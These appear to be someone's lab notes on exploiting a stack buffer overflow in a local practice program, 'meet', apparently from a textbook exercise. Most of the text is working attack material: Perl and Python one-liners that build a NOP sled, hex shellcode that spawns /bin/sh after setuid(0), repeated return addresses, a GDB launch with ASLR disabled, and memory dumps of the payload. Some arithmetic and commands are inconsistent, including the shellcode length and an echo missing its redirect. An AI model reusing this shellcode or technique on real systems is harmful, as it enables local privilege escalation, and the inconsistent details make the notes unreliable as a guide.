./meet mr `python -c 'print("\x90"*200)'`; `python -c 'print("\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'` ; `python -c 'print("\xa8\xc4\xff\xff"*37)'`;

0xffffc7a8

./meet mr `perl -e 'print "\x90"x207';``./hex_encode.py sc``perl -e 'print "\xa8\xc5\xff\xff"x38';`

The following makes use of the $(...) format, rather than those crazy backticks.  Much easier to implement.
Use echo $shellcode to print to screen, or use > to redirect to file.
I added 5 to the 200 NOPs, to make up for 5 bytes that are missing.  The book claims that the sc is 58 bytes,
but it is actually 53.  I just added another 5 NOPS to make up the difference.

shellcode=$(perl -e 'print "\x90"x205'; cat sc; perl -e 'print "\xa8\xc5\xff\xff"x38')

ASLR needs to be invoked while starting GDB, otherwise esp is diffferent every time.  The malicious return address is calculated from the esp as follows:
esp - 0x300 bytes.  Remember to reverse for little-endian.
This return address is multiplied 38 times, because:
408 byte buffer - 200 bytes of NOPs - 53 bytes shellcode / 4 bytes per address = 38.75
modulus math makes this 38.

to start gdb with ASLR turned OFF:
sudo echo "0" /proc/sys/kernel/randomize_va_space
sudo setarch i686 -R gdb --args meet mr $shellcode

set args mr "$(perl -e 'print "\x90"x205'; cat sc; perl -e 'print "\xf8\xff\xff\xd3"x38')"

address needs to be in little endian.  However, there is a three byte shortfall after the shellcode and proper alignment of the return address.
Therefore, to make up for this gap, I modified the set args command by adding three NOPs after the shellcode.

set args mr "$(perl -e 'print "\x90"x200'; cat sc; perl -e 'print "\x90"x3' ;perl -e 'print "\xf8\xd3\xff\xff"x38')"
 
now the return address lines up well in memory.

0xffffd6ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6fc:	0x31	0xc0	0x31	0xdb	0xb0	0x17	0xcd	0x80
0xffffd704:	0xeb	0x1f	0x5e	0x89	0x76	0x08	0x31	0xc0
0xffffd70c:	0x88	0x46	0x07	0x89	0x46	0x0c	0xb0	0x0b
0xffffd714:	0x89	0xf3	0x8d	0x4e	0x08	0x8d	0x56	0x0c
0xffffd71c:	0xcd	0x80	0x31	0xdb	0x89	0xd8	0x40	0xcd
0xffffd724:	0x80	0xe8	0xdc	0xff	0xff	0xff	0x2f	0x62
0xffffd72c:	0x69	0x6e	0x2f	0x73	0x68	0x90	0x90	0x90
0xffffd734:	0xf8	0xd3	0xff	0xff	0xf8	0xd3	0xff	0xff
0xffffd73c:	0xf8	0xd3	0xff	0xff	0xf8	0xd3	0xff	0xff

you can see the three extra NOPs to the right at 0xffffd72c.  Thre return address lines up well in memory, 
starting at memory address 0xffffd734.

Since we want our NOP sled to start 0x300 (768 decimal) bytes before the ESP, we subtract 0x300 from ESP to get

0xffffd3f8 - 0x300 = 0xffffd0f8

It is 0x300 (768 decimal because the buffer is 400 bytes.  There are 8 bytes of arguments, so 408 bytes.
We have 200 bytes of NOPs, 58 bytes of shellcode, so we want to be at least 408 + 300 = 700 bytes behind ESP.
0x300 is a good number since it makes hex math much easier.

now memory looks like this:

0xffffd6e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6fc:	0x31	0xc0	0x31	0xdb	0xb0	0x17	0xcd	0x80
0xffffd704:	0xeb	0x1f	0x5e	0x89	0x76	0x08	0x31	0xc0
0xffffd70c:	0x88	0x46	0x07	0x89	0x46	0x0c	0xb0	0x0b
0xffffd714:	0x89	0xf3	0x8d	0x4e	0x08	0x8d	0x56	0x0c
0xffffd71c:	0xcd	0x80	0x31	0xdb	0x89	0xd8	0x40	0xcd
0xffffd724:	0x80	0xe8	0xdc	0xff	0xff	0xff	0x2f	0x62
0xffffd72c:	0x69	0x6e	0x2f	0x73	0x68	0x90	0x90	0x90
0xffffd734:	0xf8	0xd0	0xff	0xff	0xf8	0xd0	0xff	0xff
0xffffd73c:	0xf8	0xd0	0xff	0xff	0xf8	0xd0	0xff	0xff
0xffffd744:	0xf8	0xd0	0xff	0xff	0xf8	0xd0	0xff	0xff

Notice the new return address of 0xffffd0f8.

